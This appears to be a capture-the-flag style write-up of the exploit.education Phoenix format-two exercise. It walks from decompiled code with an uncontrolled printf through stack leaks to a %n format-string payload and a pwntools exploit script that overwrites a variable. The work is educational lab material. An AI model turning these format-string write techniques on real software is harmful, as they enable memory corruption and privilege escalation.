# &#35; format-2

#### &#42; pseudocode using ghidra
```bash

void main(int param_1,int param_2)

{
  char local_110 [256];
  undefined4 *puStack16;
  
  puStack16 = &param_1;
  puts("Welcome to phoenix/format-two, brought to you by https://exploit.education");
  if (1 < param_1) {
    memset(local_110,0,0x100);
    strncpy(local_110,*(char **)(param_2 + 4),0x100);
    bounce(local_110);
  }
  if (changeme == 0) {
    puts("Better luck next time!\n");
  }
  else {
    puts("Well done, the \'changeme\' variable has been changed correctly!");
  }
                    /* WARNING: Subroutine does not return */
  exit(0);
}


void bounce(char *param_1)

{
  printf(param_1);
  return;
}


```

#### &#42; check binary
```bash
$ file /opt/phoenix/i486/format-two
/opt/phoenix/i486/format-two: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
  dynamically linked, interpreter /opt/phoenix/i486-linux-musl/lib/ld-musl-i386.so.1, not stripped

$ checksec /opt/phoenix/i486/format-two
[*] '/opt/phoenix/i486/format-two'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
    RPATH:    '/opt/phoenix/i486-linux-musl/lib'

```


#### &#42; how it work
```bash
$ /opt/phoenix/i486/format-two
Welcome to phoenix/format-two, brought to you by https://exploit.education
Better luck next time!

$ /opt/phoenix/i486/format-two aaaa
Welcome to phoenix/format-two, brought to you by https://exploit.education
aaaaBetter luck next time!

$ /opt/phoenix/i486/format-two aaaa bbbb
Welcome to phoenix/format-two, brought to you by https://exploit.education
aaaaBetter luck next time!

$ /opt/phoenix/i486/format-two aaaa.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
Welcome to phoenix/format-two, brought to you by https://exploit.education
aaaa.ffffd7eb.100.0.f7f84b67.ffffd630.ffffd618.80485a0.ffffd510.ffffd7eb.100.3e8.61616161.2e78252e.252e7825.78252e78.2e78252eBetter luck next time!

```

#### &#42; vulnerable point
```bash
#### we need to overwrite changeme
$ objdump -t /opt/phoenix/i486/format-two | grep changeme
08049868 g     O .bss	00000004 changeme
```


#### &#42; analysis
```bash

$ gdb /opt/phoenix/i486/format-two -q
GEF for linux ready, type `gef' to start, `gef config' to configure
71 commands loaded for GDB 8.2.1 using Python engine 3.5
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from /opt/phoenix/i486/format-two...(no debugging symbols found)...done.
gef> x/xw 0x08049868
0x8049868 <changeme>:	0x00000000
gef>

```

#### &#42; payload
```bash

## this payload not work
payload  = b""
payload += p32(0x08049868)
payload += b".%10x.%12$n"

$ /opt/phoenix/i486/format-two $(python -c 'print("\x68\x98\x04\x08"+".%10x.%12$n")')
Welcome to phoenix/format-two, brought to you by https://exploit.education
h.  ffffd810.Better luck next time!


## then use this payload
payload  = b""
payload += p32(0x08049868)
payload += b".%x"*11+b"%n"

$ /opt/phoenix/i486/format-two $(python -c 'print("\x68\x98\x04\x08"+".%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%n")')
Welcome to phoenix/format-two, brought to you by https://exploit.education
h.ffffd7f7.100.0.f7f84b67.ffffd640.ffffd628.80485a0.ffffd520.ffffd7f7.100.3e8.Well done, the 'changeme' variable has been changed correctly!

```

#### &#42; exploit
```bash
$ cat exp_format2.py
from pwn import *

context.arch='i386'
#context.log_level='debug'

filename="/opt/phoenix/i486/format-two"

payload  = b""
payload += p32(0x08049868)
payload += b".%x"*11+b"%n"

conn = process([filename, payload])

conn.interactive()




$ python exp_format2.py
[+] Starting local process '/opt/phoenix/i486/format-two': pid 2178
[*] Switching to interactive mode
[*] Process '/opt/phoenix/i486/format-two' stopped with exit code 0 (pid 2178)
Welcome to phoenix/format-two, brought to you by https://exploit.education
h\x98\x0.ffffd805.100.0.f7f84b67.ffffd650.ffffd638.80485a0.ffffd530.ffffd805.100.3e8Well done, the 'changeme' variable has been changed correctly!
[*] Got EOF while reading in interactive
$

```


